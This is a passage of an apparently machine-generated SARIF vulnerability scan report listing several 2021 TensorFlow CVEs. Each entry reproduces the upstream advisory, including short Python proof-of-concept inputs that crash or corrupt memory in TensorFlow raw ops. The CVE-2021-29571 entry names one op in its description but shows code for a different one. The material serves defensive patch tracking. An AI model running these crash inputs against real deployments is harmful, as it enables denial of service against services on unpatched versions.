guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team. ",
                "markdown": "**Vulnerability CVE-2021-29562**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29562)|\n\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`:\n    \n```python\nimport tensorflow as tf\n\nvalues = [-10.0] * 130\nvalues[0] = -9.999999999999995\ninputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)\ninputs = tf.cast(inputs, dtype=tf.complex64)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)\n``` \n    \nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n\n### Patches\nWe have patched the issue in GitHub commit [1c56f53be0b722ca657cbc7df461ed676c8642a2](https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team. "
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29571",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29571"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29571",
              "help": {
                "text": "Vulnerability CVE-2021-29571\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29571)\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([10, 96, 0, 1], 0.)\nboxes = tf.fill([10, 53, 0], 0.)\ncolors = tf.fill([0, 1], 0.)\n\ntf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/31bd5026304677faa8a0b77602c6154171b9aec1/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L116-L130) assumes that the last element of `boxes` input is 4, as required by [the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/DrawBoundingBoxesV2). Since this is not checked attackers passing values less than 4 can write outside of bounds of heap allocated objects and cause memory corruption:\n\n```cc \nconst auto tboxes = boxes.tensor\u003cT, 3\u003e();\nfor (int64 bb = 0; bb \u003c num_boxes; ++bb) {\n  ...\n  const int64 min_box_row = static_cast\u003cfloat\u003e(tboxes(b, bb, 0)) * (height - 1);\n  const int64 max_box_row = static_cast\u003cfloat\u003e(tboxes(b, bb, 2)) * (height - 1);\n  const int64 min_box_col = static_cast\u003cfloat\u003e(tboxes(b, bb, 1)) * (width - 1);\n  const int64 max_box_col = static_cast\u003cfloat\u003e(tboxes(b, bb, 3)) * (width - 1);\n  ...\n}\n``` \n\nIf the last dimension in `boxes` is less than 4, accesses similar to `tboxes(b, bb, 3)` will access data outside of bounds. Further during code execution there are also writes to these indices.\n\n### Patches\nWe have patched the issue in GitHub commit [79865b542f9ffdc9caeb255631f7c56f1d4b6517](https://github.com/tensorflow/tensorflow/commit/79865b542f9ffdc9caeb255631f7c56f1d4b6517).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29571**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29571)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([10, 96, 0, 1], 0.)\nboxes = tf.fill([10, 53, 0], 0.)\ncolors = tf.fill([0, 1], 0.)\n\ntf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/31bd5026304677faa8a0b77602c6154171b9aec1/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L116-L130) assumes that the last element of `boxes` input is 4, as required by [the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/DrawBoundingBoxesV2). Since this is not checked attackers passing values less than 4 can write outside of bounds of heap allocated objects and cause memory corruption:\n\n```cc \nconst auto tboxes = boxes.tensor\u003cT, 3\u003e();\nfor (int64 bb = 0; bb \u003c num_boxes; ++bb) {\n  ...\n  const int64 min_box_row = static_cast\u003cfloat\u003e(tboxes(b, bb, 0)) * (height - 1);\n  const int64 max_box_row = static_cast\u003cfloat\u003e(tboxes(b, bb, 2)) * (height - 1);\n  const int64 min_box_col = static_cast\u003cfloat\u003e(tboxes(b, bb, 1)) * (width - 1);\n  const int64 max_box_col = static_cast\u003cfloat\u003e(tboxes(b, bb, 3)) * (width - 1);\n  ...\n}\n``` \n\nIf the last dimension in `boxes` is less than 4, accesses similar to `tboxes(b, bb, 3)` will access data outside of bounds. Further during code execution there are also writes to these indices.\n\n### Patches\nWe have patched the issue in GitHub commit [79865b542f9ffdc9caeb255631f7c56f1d4b6517](https://github.com/tensorflow/tensorflow/commit/79865b542f9ffdc9caeb255631f7c56f1d4b6517).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "4.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29536",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29536"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29536",
              "help": {
                "text": "Vulnerability CVE-2021-29536\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29536](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29536)\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedReshape` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant([], dtype=tf.qint32)\nshape = tf.constant([], dtype=tf.int32)\ninput_min = tf.constant([], dtype=tf.float32)\ninput_max = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a324ac84e573fba362a5e53d4e74d5de6729933e/tensorflow/core/kernels/quantized_reshape_op.cc#L38-L55) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst auto\u0026 input_min_float_tensor = ctx-\u003einput(2);\n...\nconst float input_min_float = input_min_float_tensor.flat\u003cfloat\u003e()(0);\nconst auto\u0026 input_max_float_tensor = ctx-\u003einput(3);\n...\nconst float input_max_float = input_max_float_tensor.flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [a324ac84e573fba362a5e53d4e74d5de6729933e](https://github.com/tensorflow/tensorflow/commit/a324ac84e573fba362a5e53d4e74d5de6729933e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29536**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29536](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29536)|\n\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedReshape` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant([], dtype=tf.qint32)\nshape = tf.constant([], dtype=tf.int32)\ninput_min = tf.constant([], dtype=tf.float32)\ninput_max = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a324ac84e573fba362a5e53d4e74d5de6729933e/tensorflow/core/kernels/quantized_reshape_op.cc#L38-L55) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst auto\u0026 input_min_float_tensor = ctx-\u003einput(2);\n...\nconst float input_min_float = input_min_float_tensor.flat\u003cfloat\u003e()(0);\nconst auto\u0026 input_max_float_tensor = ctx-\u003einput(3);\n...\nconst float input_max_float = input_max_float_tensor.flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [a324ac84e573fba362a5e53d4e74d5de6729933e](https://github.com/tensorflow/tensorflow/commit/a324ac84e573fba362a5e53d4e74d5de6729933e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29557",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29557"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29557",
              "help": {
                "text": "Vulnerability CVE-2021-29557\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29557)\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`:\n\n```python\nimport tensorflow as tf\n\na = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)\nb = tf.constant([], shape=[0, 2], dtype=tf.float32)\n\ntf.raw_ops.SparseMatMul(\n    a=a, b=b, transpose_a=True, transpose_b=True,\n    a_is_sparse=True, b_is_sparse=True)\n``` \n    \nThe division by 0 occurs deep in Eigen code because the `b` tensor is empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29557**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29557)|\n\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`:\n\n```python\nimport tensorflow as tf\n\na = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)\nb = tf.constant([], shape=[0, 2], dtype=tf.float32)\n\ntf.raw_ops.SparseMatMul(\n    a=a, b=b, transpose_a=True, transpose_b=True,\n    a_is_sparse=True, b_is_sparse=True)\n``` \n    \nThe division by 0 occurs deep in Eigen code because the `b` tensor is empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29606",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29606"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29606",
              "help": {
                "text": "Vulnerability CVE-2021-29606\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29606](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29606)\n### Impact\nA specially crafted TFLite model could trigger an OOB read on heap in the TFLite implementation of [`Split_V`](https://github.com/tensorflow/tensorflow/blob/c59c37e7b2d563967da813fa50fe20b21f4da683/tensorflow/lite/kernels/split_v.cc#L99):\n\n```cc\nconst int input_size = SizeOfDimension(input, axis_value);\n``` \n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the [`SizeOfDimension` function](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/kernel_util.h#L148-L150) will access data outside the bounds of the tensor shape array:\n\n```cc\ninline int SizeOfDimension(const TfLiteTensor* t, int dim) {\n  return t-\u003edims-\u003edata[dim];\n}\n```\n  \n### Patches \nWe have patched the issue in GitHub commit [ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412](https://github.com/tensorflow/tensorflow/commit/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29606**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29606](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29606)|\n\n### Impact\nA specially crafted TFLite model could trigger an OOB read on heap in the TFLite implementation of [`Split_V`](https://github.com/tensorflow/tensorflow/blob/c59c37e7b2d563967da813fa50fe20b21f4da683/tensorflow/lite/kernels/split_v.cc#L99):\n\n```cc\nconst int input_size = SizeOfDimension(input, axis_value);\n``` \n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the [`SizeOfDimension` function](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/kernel_util.h#L148-L150) will access data outside the bounds of the tensor shape array:\n\n```cc\ninline int SizeOfDimension(const TfLiteTensor* t, int dim) {\n  return t-\u003edims-\u003edata[dim];\n}\n```\n  \n### Patches \nWe have patched the issue in GitHub commit [ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412](https://github.com/tensorflow/tensorflow/commit/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29594",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29594"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29594",
              "help": {
                "text": "Vulnerability CVE-2021-29594\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29594](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29594)\n### Impact\nTFLite`s [convolution code](https://github.com/tensorflow/tensorflow/blob/09c73bca7d648e961dd05898292d91a8322a9d45/tensorflow/lite/kernels/conv.cc) has multiple division where the divisor is controlled by the user and not checked to be non-zero. For example:\n\n```cc \nconst int input_size = NumElements(input) / SizeOfDimension(input, 0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ff489d95a9006be080ad14feb378f2b4dac35552](https://github.com/tensorflow/tensorflow/commit/ff489d95a9006be080ad14feb378f2b4dac35552).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. ",
                "markdown": "**Vulnerability CVE-2021-29594**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29594](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29594)|\n\n### Impact\nTFLite`s [convolution code](https://github.com/tensorflow/tensorflow/blob/09c73bca7d648e961dd05898292d91a8322a9d45/tensorflow/lite/kernels/conv.cc) has multiple division where the divisor is controlled by the user and not checked to be non-zero. For example:\n\n```cc \nconst int input_size = NumElements(input) / SizeOfDimension(input, 0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ff489d95a9006be080ad14feb378f2b4dac35552](https://github.com/tensorflow/tensorflow/commit/ff489d95a9006be080ad14feb378f2b4dac35552).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. "
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29605",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29605"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29605",
              "help": {
                "text": "Vulnerability CVE-2021-29605\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29605](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29605)\n### Impact\nThe TFLite code for allocating `TFLiteIntArray`s is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L24-L27):\n\n```cc\nint TfLiteIntArrayGetSizeInBytes(int size) {\n  static TfLiteIntArray dummy;\n  return sizeof(dummy) + sizeof(dummy.data[0]) * size;\n}   \n```\n\nAn attacker can craft a model such that the `size` multiplier is so large that the return value overflows the `int` datatype and becomes negative. In turn, this results in [invalid value being given to `malloc`](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L47-L52):\n\n```cc\nTfLiteIntArray* TfLiteIntArrayCreate(int size) {\n  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(TfLiteIntArrayGetSizeInBytes(size));\n  ret-\u003esize = size; \n  return ret;\n}\n``` \n\nIn this case, `ret-\u003esize` would dereference an invalid pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [7c8cc4ec69cd348e44ad6a2699057ca88faad3e5](https://github.com/tensorflow/tensorflow/commit/7c8cc4ec69cd348e44ad6a2699057ca88faad3e5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29605**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29605](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29605)|\n\n### Impact\nThe TFLite code for allocating `TFLiteIntArray`s is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L24-L27):\n\n```cc\nint TfLiteIntArrayGetSizeInBytes(int size) {\n  static TfLiteIntArray dummy;\n  return sizeof(dummy) + sizeof(dummy.data[0]) * size;\n}   \n```\n\nAn attacker can craft a model such that the `size` multiplier is so large that the return value overflows the `int` datatype and becomes negative. In turn, this results in [invalid value being given to `malloc`](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L47-L52):\n\n```cc\nTfLiteIntArray* TfLiteIntArrayCreate(int size) {\n  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(TfLiteIntArrayGetSizeInBytes(size));\n  ret-\u003esize = size; \n  return ret;\n}\n``` \n\nIn this case, `ret-\u003esize` would dereference an invalid pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [7c8cc4ec69cd348e44ad6a2699057ca88faad3e5](https://github.com/tensorflow/tensorflow/commit/7c8cc4ec69cd348e44ad6a2699057ca88faad3e5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29608",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29608"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29608",
              "help": {
                "text": "Vulnerability CVE-2021-29608\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29608](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29608)\n### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = [`ROW_SPLITS`]\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don`t prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29608**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29608](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29608)|\n\n### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = [`ROW_SPLITS`]\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don`t prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
